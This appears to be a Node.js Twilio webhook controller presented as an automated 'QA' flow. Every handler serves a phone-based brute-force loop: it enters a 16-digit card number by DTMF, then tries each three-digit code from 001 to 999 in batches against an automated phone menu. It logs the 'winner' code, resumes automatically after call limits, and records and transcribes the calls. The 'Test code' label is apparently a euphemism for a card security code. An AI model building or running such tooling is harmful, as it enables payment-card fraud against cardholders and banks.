import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as transcriptionService from '../services/transcriptionService.js';
import { supabase } from '../config/db.js';

// Generate TwiML for when the call is answered (Outbound Automated QA Flow)
export const getTwiML = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('test_value')
      .eq('id', attemptId)
      .single();

    if (fetchErr || !attempt) {
      throw new Error(`Attempt #${attemptId} not found.`);
    }

    const twiml = new twilio.twiml.VoiceResponse();

    let card = attempt.test_value;
    let testCode = '';

    if (attempt.test_value.includes(':')) {
      [card, testCode] = attempt.test_value.split(':');
    }

    if (testCode) {
      // This is a Test code brute force run!
      await AttemptModel.addLog(attemptId, `Call connected. Starting brute force for card: ${card}. Trying first code: ${testCode}...`);

      // Use Twilio's Redirect verb to jump to our loop handler
      const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
      twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${testCode}&isFirst=true`);

    } else {
      // Standard non-Test code test run
      await AttemptModel.addLog(attemptId, `Call connected. Sending DTMF sequence: ${card}`);
      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
      twiml.pause({ length: waitSeconds });
      twiml.play({ digits: `wwww${card}` });

      // Standard wait and hangup
      twiml.pause({ length: 15 });
      twiml.hangup();
    }

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (error) {
    console.error('Error generating TwiML:', error);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.say('An error occurred during call orchestration.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Webhook for handling the continuous TwiML Redirect loop
export const handleTryCode = async (req, res) => {
  const { attemptId } = req.params;
  let { currentTestCode, isFirst } = req.query;

  let currentCodeNum = parseInt(currentTestCode);

  // Safety check for exhausted codes
  if (currentCodeNum > 999) {
    await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
    await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Get base card, target code, status, and winner for checking completion
  const { data: attempt } = await supabase
    .from('attempts')
    .select('test_value, target_test_code, status, result_details')
    .eq('id', attemptId)
    .single();

  let baseCard = '1234567890123456';
  let targetTestCode = null;
  let winnerCode = null;

  if (attempt) {
    if (attempt.test_value) baseCard = attempt.test_value.split(':')[0];
    targetTestCode = attempt.target_test_code;
    if (attempt.result_details && attempt.result_details.winner) {
      winnerCode = attempt.result_details.winner;
    }
  }

  // If call status is already completed/failed or winner is confirmed, stop immediately!
  const isCompleted = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || winnerCode);
  if (isCompleted) {
    console.log(`[handleTryCode] Attempt #${attemptId} is already ${attempt ? attempt.status : 'finished'} (Winner: ${winnerCode}). Hanging up call immediately.`);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const twiml = new twilio.twiml.VoiceResponse();

  const BATCH_SIZE = 50;
  const endCodeNum = Math.min(currentCodeNum + BATCH_SIZE, 1000);

  let lastCodeInBatch = '';
  const batchLogs = [];
  const targetWinner = winnerCode || targetTestCode;
  let reachedWinner = false;

  for (let i = currentCodeNum; i < endCodeNum; i++) {
    const codeStr = i.toString().padStart(3, '0');
    lastCodeInBatch = codeStr;

    if (i === currentCodeNum && isFirst === 'true') {
      batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
      twiml.pause({ length: waitSeconds });
      twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
    } else {
      batchLogs.push(`IVR says "Incorrect Test Code" for ${codeStr}. Trying next...`);
      batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
      twiml.pause({ length: 2 });
      twiml.play({ digits: codeStr });
    }

    if (targetWinner && codeStr === targetWinner) {
      reachedWinner = true;
      break; // Stop adding more codes to TwiML once target code is reached!
    }
  }

  await AttemptModel.addLogs(attemptId, batchLogs);

  // Update the DB so the frontend shows the current Test code progressing
  await AttemptModel.updateTestValue(attemptId, `${baseCard}:${lastCodeInBatch}`);

  if (reachedWinner) {
    console.log(`[handleTryCode] Target winner code ${targetWinner} reached in TwiML. Hanging up call immediately.`);
    twiml.pause({ length: 2 });
    twiml.hangup(); // Stop immediately, do NOT redirect to next batch!
  } else {
    const nextTestCode = endCodeNum.toString().padStart(3, '0');
    twiml.pause({ length: 1 });
    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
  }

  res.type('text/xml');
  return res.send(twiml.toString());
};

// Webhook for handling the interactive listen loop (DEPRECATED - Replaced by handleTryCode)
export const handleInteractiveListen = async (req, res) => {
  // Keep this for backwards compatibility if needed, but it is no longer used in the main flow
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.hangup();
  res.type('text/xml');
  return res.send(twiml.toString());
};

// Webhook exclusively for Twilio Studio Flow outcomes (using CallSid)
export const handleStudioWebhook = async (req, res) => {
  const { CallSid, flow_status } = req.body;
  try {
    if (!CallSid || !flow_status) {
      return res.status(400).send('Missing CallSid or flow_status');
    }

    // Find the exact attempt matching this CallSid
    const { data: attempt } = await supabase.from('attempts').select('id, test_value').eq('call_sid', CallSid).single();
    if (!attempt) {
      console.warn(`[Studio Webhook] Received webhook for unknown CallSid: ${CallSid}`);
      return res.status(404).send('Unknown CallSid');
    }

    const attemptId = attempt.id;
    await AttemptModel.addLog(attemptId, `Studio Flow Webhook: ${flow_status}`);
    
    if (flow_status === 'success_correct_code') {
      let winnerCode = '';
      if (attempt.test_value && attempt.test_value.includes(':')) {
         winnerCode = attempt.test_value.split(':')[1];
      }
      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, { winner: winnerCode });
    } else if (flow_status === 'failed_invalid_card') {
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Studio Flow rejected the 16-digit card number' });
    }
    
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling studio webhook:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for tracking call status updates from Twilio
export const handleStatusCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { CallStatus, CallDuration } = req.body;
  try {
    if (CallStatus) {
      await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);

      if (CallStatus === 'completed') {
        const duration = parseInt(CallDuration) || 0;

        const { data: attempt } = await supabase.from('attempts').select('result_details, target_test_code, status').eq('id', attemptId).single();
        const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;

        if (attempt && attempt.target_test_code && !foundWinner && attempt.status !== 'failed' && attempt.status !== 'completed') {
          await AttemptModel.addLog(attemptId, 'Call completed prematurely at Twilio limit without reaching target. Auto-resuming...');
          await AttemptModel.updateAttemptStatus(attemptId, 'queued', duration, { twilioStatus: CallStatus });
        } else if (attempt && attempt.status !== 'failed' && attempt.status !== 'completed') {
          await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
        } else if (duration > 0) {
          // If attempt was already marked completed by Studio Webhook, update the actual Twilio Call Duration!
          await supabase.from('attempts').update({ duration }).eq('id', attemptId);
          await AttemptModel.addLog(attemptId, `Call duration updated from Twilio status callback: ${duration}s`);
        }
      } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
        const duration = parseInt(CallDuration) || 0;
        await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
      }
    }

    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling status callback:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for handling recording callbacks
export const handleRecordingCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { RecordingUrl, RecordingStatus } = req.body;
  try {
    await AttemptModel.addLog(attemptId, `Twilio Recording Callback status: ${RecordingStatus}`);
    if (RecordingUrl) {
      await AttemptModel.addLog(attemptId, `Recording URL: ${RecordingUrl}`);

      // Start transcription and analysis asynchronously
      transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
        console.error(`Error transcribing recording for attempt #${attemptId}:`, err);
      });
    }
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling recording callback:', error);
    return res.status(500).send('Error');
  }
};
